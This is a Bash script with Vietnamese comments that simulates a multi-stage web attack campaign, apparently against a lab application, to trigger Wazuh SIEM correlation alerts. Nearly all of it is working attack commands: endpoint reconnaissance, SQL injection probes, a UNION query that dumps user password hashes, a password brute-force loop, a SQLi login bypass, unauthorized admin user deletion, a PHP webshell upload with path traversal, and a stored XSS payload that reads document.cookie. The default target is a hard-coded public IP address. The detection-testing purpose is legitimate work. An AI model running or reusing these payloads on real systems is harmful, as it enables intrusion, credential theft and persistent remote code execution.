#!/usr/bin/env bash
# ============================================================================
#  MULTI-STAGE WEB ATTACK — kịch bản tấn công đa giai đoạn (kill chain)
#  Mô phỏng 1 attacker chuỗi nhiều lỗ hổng thành 1 chiến dịch, đúng thứ tự
#  MITRE ATT&CK: Recon -> Initial Access -> Credential Access -> Priv Esc ->
#                Execution/Persistence -> Impact.
#  Mỗi giai đoạn sinh alert Wazuh -> tương quan thành "attack campaign".
#
#  Dùng:  ./multi_stage_attack.sh http://<IP-web>:8080
#  (mặc định: http://3.235.130.71:8080)
# ============================================================================
set -u
HOST="${1:-http://3.235.130.71:8080}"
PAUSE="${PAUSE:-2}"   # nghỉ giữa các bước để alert xếp đúng thứ tự

line(){ echo; echo "──────────────────────────────────────────────────────────"; }
stage(){ line; echo "▶ STAGE $1 — $2"; echo "   MITRE: $3"; }
run(){ echo "   \$ $1"; eval "$1" >/dev/null 2>&1; sleep "$PAUSE"; }

echo "############################################################"
echo "#   MULTI-STAGE WEB ATTACK  ->  target: $HOST"
echo "############################################################"

# ---- STAGE 1: RECONNAISSANCE (dò tìm) ----
stage 1 "Reconnaissance — dò endpoint" "T1595 Active Scanning"
run "curl -s -A 'sqlmap/1.7' '$HOST/robots.txt'"
run "curl -s '$HOST/admin'"
run "curl -s '$HOST/api/v1/products'"
for p in backup .env config admin.php phpmyadmin .git/config; do
  run "curl -s '$HOST/$p'"
done

# ---- STAGE 2: INITIAL ACCESS — SQL Injection dò lỗi ----
stage 2 "Initial Access — SQL Injection (thăm dò)" "T1190 Exploit Public-Facing App"
run "curl -s \"$HOST/api/v1/products/1'\""
run "curl -s \"$HOST/api/v1/products/1%20OR%201=1\""

# ---- STAGE 3: CREDENTIAL ACCESS — SQLi UNION rút mật khẩu ----
stage 3 "Credential Access — SQLi UNION dump users" "T1190 + T1552 Unsecured Credentials"
UNION="0%20UNION%20SELECT%20id,now(),now(),password_hash,NULL,false,email,0,NULL,0,CAST(role%20AS%20varchar),id%20FROM%20users--"
run "curl -s \"$HOST/api/v1/products/$UNION\""

# ---- STAGE 4: CREDENTIAL ACCESS — Brute force + Auth bypass ----
stage 4 "Credential Access — Brute force + SQLi bypass" "T1110 Brute Force / T1078 Valid Accounts"
for p in 123456 admin password admin123 letmein nike2024; do
  run "curl -s -X POST '$HOST/api/v1/auth/login' -H 'Content-Type: application/json' -d '{\"username\":\"admin@example.com\",\"password\":\"$p\"}'"
done
# bypass đăng nhập bằng SQLi
run "curl -s -X POST '$HOST/api/v1/auth/login' -H 'Content-Type: application/json' -d '{\"username\":\"admin@example.com'\''--\",\"password\":\"x\"}'"

# ---- STAGE 5: PRIVILEGE ESCALATION — Broken Access ----
stage 5 "Privilege Escalation — Broken Access Control" "T1078 Valid Accounts / T1068"
run "curl -s '$HOST/api/admin/users?page=0&size=100'"
run "curl -s -X DELETE '$HOST/api/admin/users/9999'"

# ---- STAGE 6: EXECUTION/PERSISTENCE — Upload webshell + Path traversal ----
stage 6 "Persistence — Webshell upload + Path Traversal" "T1505.003 Web Shell / T1083"
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
run "curl -s -F 'file=@/tmp/shell.php' '$HOST/api/v1/vuln/upload'"
run "curl -s -F 'file=@/tmp/shell.php;filename=../../../PWNED.txt' '$HOST/api/v1/vuln/upload'"

# ---- STAGE 7: IMPACT — Stored XSS ----
stage 7 "Impact — Stored XSS (đánh cắp phiên nạn nhân)" "T1059.007 JavaScript"
run "curl -s -X POST '$HOST/reviews/add/20' -F 'rating=5' -F 'title=t' -F 'comment=<img src=x onerror=alert(document.cookie)>'"

line
echo "✅ HOÀN TẤT chiến dịch tấn công đa giai đoạn."
echo "   -> Kiểm tra Wazuh Dashboard: chuỗi alert cùng 1 IP nguồn theo thời gian"
echo "   -> Rule 100200 sẽ báo 'MULTI-STAGE WEB ATTACK' (level 15)."
